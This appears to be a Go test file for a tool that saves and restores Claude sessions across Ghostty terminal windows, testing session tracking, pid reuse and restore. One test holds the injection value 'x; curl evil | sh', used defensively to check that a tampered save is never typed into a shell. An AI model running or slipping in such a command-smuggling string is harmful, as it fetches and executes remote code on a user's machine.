package claudesessions

import (
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/nicholas1513/handoff/internal/queue"
)

const (
	idA = "aaaaaaaa-0000-4000-8000-000000000001"
	idB = "bbbbbbbb-0000-4000-8000-000000000002"
	idC = "cccccccc-0000-4000-8000-000000000003"
	idD = "dddddddd-0000-4000-8000-000000000004"
)

var t0 = time.Date(2026, 11, 6, 14, 2, 0, 0, time.Local)

// world fakes the kernel, the ttys and Ghostty. Each running pid p has start time p*10 and tty p*100;
// /dev/ttysN is device N.
type world struct {
	q       *queue.Queue
	pids    map[int]procInfo
	ghostty string // what the query script prints
	gerr    error
	calls   [][]string // osascript calls after the script: the open script's arguments
	opened  bool
}

func newWorld(t *testing.T) *world {
	w := &world{q: &queue.Queue{Root: t.TempDir()}, pids: map[int]procInfo{}}
	oldProc, oldTTY, oldOsa := proc, ttyDev, osascript
	proc = func(pid int) (procInfo, bool) { p, ok := w.pids[pid]; return p, ok }
	ttyDev = func(path string) (int64, bool) {
		n, err := strconv.ParseInt(strings.TrimPrefix(path, "/dev/ttys"), 10, 64)
		return n, err == nil
	}
	osascript = func(script string, args ...string) (string, error) {
		if script == queryScript {
			return w.ghostty, w.gerr
		}
		w.opened = true
		w.calls = append(w.calls, args)
		return "", nil
	}
	t.Cleanup(func() { proc, ttyDev, osascript = oldProc, oldTTY, oldOsa })
	return w
}

// session records a session as the hook would, owned by pid (running unless removed from w.pids), with a transcript.
func (w *world) session(t *testing.T, id string, pid int, started time.Time) {
	tr := filepath.Join(w.q.Root, id+".jsonl")
	os.WriteFile(tr, []byte("{}\n"), 0o600)
	s := queue.Session{SessionID: id, Cwd: "/src/" + id[:1], TranscriptPath: tr, Started: started, ClaudePID: pid, ClaudeStart: int64(pid * 10)}
	if err := w.q.WriteSession(s); err != nil {
		t.Fatal(err)
	}
	w.pids[pid] = procInfo{start: int64(pid * 10), tty: int64(pid * 100), name: "2.1.319"}
}

func ids(ws [][]Tab) [][]string {
	var out [][]string
	for _, w := range ws {
		var r []string
		for _, t := range w {
			r = append(r, t.SessionID[:1])
		}
		out = append(out, r)
	}
	return out
}

func TestSaveFollowsGhosttyWindowsAndTabs(t *testing.T) {
	w := newWorld(t)
	w.session(t, idA, 1, t0)
	w.session(t, idB, 2, t0)
	w.session(t, idC, 3, t0)
	w.session(t, idD, 4, t0) // in another terminal
	// A shell tab with no Claude in it (tty 900) is left out; B's window comes first because Ghostty lists it first.
	w.ghostty = "w2\t1\t/dev/ttys200\nw1\t1\t/dev/ttys100\nw1\t2\t/dev/ttys900\nw1\t3\t/dev/ttys300\n"
	msg, err := Save(w.q, t0)
	if err != nil || msg != "saved 3 windows · 4 sessions" {
		t.Fatalf("Save = %q %v", msg, err)
	}
	s, err := Load(w.q.Root)
	if err != nil {
		t.Fatal(err)
	}
	if got, want := ids(s.Windows), [][]string{{"b"}, {"a", "c"}, {"d"}}; !reflect.DeepEqual(got, want) {
		t.Fatalf("windows = %v, want %v", got, want)
	}
	if fi, _ := os.Stat(filepath.Join(w.q.Root, file)); fi.Mode().Perm() != 0o600 {
		t.Fatalf("save mode = %v", fi.Mode().Perm())
	}
}

// /clear starts a new session id in the same Claude process: only the newest is the tab's.
func TestSaveKeepsNewestSessionPerProcess(t *testing.T) {
	w := newWorld(t)
	w.session(t, idA, 1, t0)
	w.session(t, idB, 1, t0.Add(time.Minute))
	w.ghostty = "w1\t1\t/dev/ttys100\n"
	Save(w.q, t0)
	s, _ := Load(w.q.Root)
	if got := ids(s.Windows); !reflect.DeepEqual(got, [][]string{{"b"}}) {
		t.Fatalf("windows = %v, want only the newest session", got)
	}
}

func TestSaveSkipsEndedAndReusedPids(t *testing.T) {
	w := newWorld(t)
	w.session(t, idA, 1, t0)
	w.session(t, idB, 2, t0)
	w.session(t, idC, 3, t0)
	delete(w.pids, 1)                          // ended
	w.pids[2] = procInfo{start: 999, tty: 200} // pid reused by another process
	msg, err := Save(w.q, t0)
	if err != nil || msg != "saved 1 window · 1 session" {
		t.Fatalf("Save = %q %v", msg, err)
	}
}

// After a reboot nothing runs; saving then must not wipe the save worth restoring.
func TestSaveRefusesNoneAndKeepsLastSave(t *testing.T) {
	w := newWorld(t)
	w.session(t, idA, 1, t0)
	Save(w.q, t0)
	delete(w.pids, 1)
	if _, err := Save(w.q, t0.Add(time.Hour)); err == nil {
		t.Fatal("saved an empty set")
	}
	if s, err := Load(w.q.Root); err != nil || !s.SavedAt.Equal(t0) || count(s.Windows) != 1 {
		t.Fatalf("last save = %+v %v, want it kept", s, err)
	}
}

func TestSaveWithoutGhosttyPutsAllInOneWindow(t *testing.T) {
	w := newWorld(t)
	w.session(t, idA, 1, t0)
	w.session(t, idB, 2, t0.Add(-time.Minute))
	w.gerr = errors.New("not authorized")
	msg, err := Save(w.q, t0)
	if err != nil || !strings.Contains(msg, "not authorized") {
		t.Fatalf("Save = %q %v, want the Ghostty error named", msg, err)
	}
	s, _ := Load(w.q.Root)
	if got := ids(s.Windows); !reflect.DeepEqual(got, [][]string{{"b", "a"}}) {
		t.Fatalf("windows = %v, want one window, oldest first", got)
	}
}

func TestRestoreOpensWhatIsNotRunning(t *testing.T) {
	w := newWorld(t)
	w.session(t, idA, 1, t0)
	w.session(t, idB, 2, t0)
	w.session(t, idC, 3, t0)
	w.session(t, idD, 4, t0)
	w.ghostty = "w1\t1\t/dev/ttys100\nw1\t2\t/dev/ttys200\nw2\t1\t/dev/ttys300\nw3\t1\t/dev/ttys400\n"
	Save(w.q, t0)
	// A is still running, C's transcript was deleted, B and D ended.
	delete(w.pids, 2)
	delete(w.pids, 3)
	delete(w.pids, 4)
	os.Remove(filepath.Join(w.q.Root, idC+".jsonl"))
	p, err := Prepare(w.q)
	if err != nil {
		t.Fatal(err)
	}
	if got := p.Summary(); got != "2 windows · 2 sessions (1 running, 1 gone)" {
		t.Fatalf("Summary = %q", got)
	}
	msg, err := p.Restore()
	if err != nil || msg != "restored 2 windows · 2 sessions (1 running, 1 gone)" {
		t.Fatalf("Restore = %q %v", msg, err)
	}
	want := [][]string{{"0", "/src/b", idB, "1", "/src/d", idD}}
	if !reflect.DeepEqual(w.calls, want) {
		t.Fatalf("open args = %q, want %q", w.calls, want)
	}
}

// The id is typed into a shell; a save edited to hold anything else is never opened.
func TestRestoreNeverTypesANonSessionID(t *testing.T) {
	w := newWorld(t)
	bad := "x; curl evil | sh"
	if err := write(w.q.Root, Saved{SavedAt: t0, Windows: [][]Tab{{{SessionID: bad, Cwd: "/", TranscriptPath: w.q.Root}}}}); err != nil {
		t.Fatal(err)
	}
	p, err := Prepare(w.q)
	if err != nil || p.Gone != 1 || len(p.Open) != 0 {
		t.Fatalf("Prepare = %+v %v, want it gone", p, err)
	}
	if _, err := (Plan{Open: [][]Tab{{{SessionID: bad}}}}).Restore(); err == nil || w.opened {
		t.Fatalf("Restore err = %v opened = %v, want refused", err, w.opened)
	}
}

func TestRestoreNothingSaved(t *testing.T) {
	w := newWorld(t)
	if got := Command(w.q, "restore", t0); got != "claude-sessions restore: no saved sessions yet" {
		t.Fatalf("Command = %q", got)
	}
	if got := Command(w.q, "", t0); !strings.HasPrefix(got, "no saved sessions yet") {
		t.Fatalf("Command = %q", got)
	}
}

func TestLabel(t *testing.T) {
	s := Saved{SavedAt: t0, Windows: [][]Tab{{{}, {}}, {{}}}}
	if got := s.Label(t0.Add(time.Hour)); got != "saved 14:02 · 2 windows · 3 sessions" {
		t.Fatalf("today: %q", got)
	}
	if got := s.Label(t0.AddDate(0, 0, 1)); got != "saved Nov 6 14:02 · 2 windows · 3 sessions" {
		t.Fatalf("yesterday: %q", got)
	}
}
